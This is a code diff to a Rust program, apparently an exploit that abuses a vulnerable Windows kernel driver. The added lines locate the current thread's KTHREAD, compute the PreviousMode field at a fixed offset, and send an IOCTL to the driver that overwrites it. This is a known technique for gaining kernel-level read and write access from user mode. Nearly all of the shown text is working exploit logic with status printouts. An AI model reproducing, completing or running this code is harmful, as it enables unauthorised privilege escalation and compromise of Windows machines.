@@ -1,6 +1,8 @@
 use std::{thread, time};
+use std::process::Command;
 
-use winapi::ctypes::c_void; 
+use std::ffi::{c_void};
+use std::ptr::NonNull;
 use winapi::shared::minwindef::{DWORD};     /// Can add LPVOID, etc.
 //use winapi::um::handleapi::{CloseHandle};
 
@@ -138,11 +140,35 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
 
+    // Get KTHREAD and then KTHREAD.PreviousMode
+    let thread_addr: Option<*mut c_void> = km_utils::get_thread_info();
+    let mut pm: Option<*mut u8> = None;
 
-    km_utils::get_thread_info();
+    if let Some(ptr) = thread_addr {
+        let addr = ptr as usize;
+        pm = Some((addr + 0x232) as *mut u8);
 
+        println!("[*] Thread pointer: {:p}", ptr);
+        println!("[+] Pointer to modus previosa of our thread: {:p}", pm.unwrap());
+    } else {
+        println!("[!] Failed to get thread info");
+        std::process::exit(-1);
+    }
 
+    println!("[>] Modus Previosa modification...");
+    unsafe {
+        xp_utils::send_ioctl_to_driver(
+            h_drv,
+            pm.unwrap() as usize as u64,
+            0x1,
+        );
+    }
 
+    // Sleeping for 10 min
+    //let sleepy_time = time::Duration::from_millis(60000);
+    //thread::sleep(sleepy_time);
+
+    // Pause & exit
     println!("");
     Ok(())
 }
